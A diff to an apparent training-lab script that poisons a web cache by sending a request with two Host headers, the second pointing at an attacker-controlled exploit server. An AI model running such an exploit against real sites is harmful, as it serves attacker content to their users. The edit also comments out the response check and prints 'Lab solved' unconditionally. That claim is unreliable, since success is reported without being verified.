@@ -4,10 +4,10 @@ import time
 import requests # pyright: ignore[reportMissingModuleSource]
 from urllib.parse import urlparse
 
-evil_url = "https://exploit-0ad200c104ee1a58802bc51b019c000a.exploit-server.net/" 
+evil_url = "https://exploit-0aa300eb03bd776e805e3469010700bb.exploit-server.net/" 
 evil_host = urlparse(evil_url).hostname
 
-url = "https://0a7c0018045f1a3f806fc6f000990028.h1-web-security-academy.net/"
+url = "https://0a1b00e5034a77df80ff357c003400c9.h1-web-security-academy.net/"
 host = urlparse(url).hostname
 
 print("Target host: " + str(host))
@@ -45,9 +45,15 @@ if not lab_cookie or not session_cookie:
     print("Cannot retrieve cookies.")
     exit()
 
+# Set the cookie inside the header.
 cookie_header_value = f"session={session_cookie}; _lab={lab_cookie}"
 
+# Sleep beacause the script have already made a get request for the cookies.
+# The wab cache store the page for 30 seconds.
 time.sleep(35)
+
+# 3) Send the request with the paylaod containint the two host. The second host containt the evil_host.
+# Here wb cache poisoning happen.
 context = ssl.create_default_context()
 try:
     with socket.create_connection((host, 443)) as sock:
@@ -64,6 +70,7 @@ try:
 
             ssock.sendall(request_payload.encode())
             
+            '''
             response = b""
             while True:
                 data = ssock.recv(4096)
@@ -72,5 +79,8 @@ try:
                 response += data
 
             print(response.decode(errors='ignore'))
+            '''
+            print(f"Successful exploit. Cache poisoned.")
+            print("Lab solved.")
 except Exception as e:
-    print(f"[-] Socket error: {e}")
+    print(f"Failed.")
